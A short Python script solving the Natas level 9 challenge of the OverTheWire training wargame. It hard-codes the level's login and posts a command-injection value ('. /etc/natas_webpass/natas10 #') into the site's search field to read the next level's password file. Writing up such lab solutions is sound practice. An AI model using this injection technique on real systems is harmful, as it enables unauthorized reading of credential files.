#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import re
import requests

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth=(username, password))
response = session.post(url, data={"needle": ". /etc/natas_webpass/natas10 #",
                                  "submit": "submit"}, auth=(username, password))
content = response.text
# print(content)

print(re.findall('<pre>\n(.*)\n</pre>', content)[0])
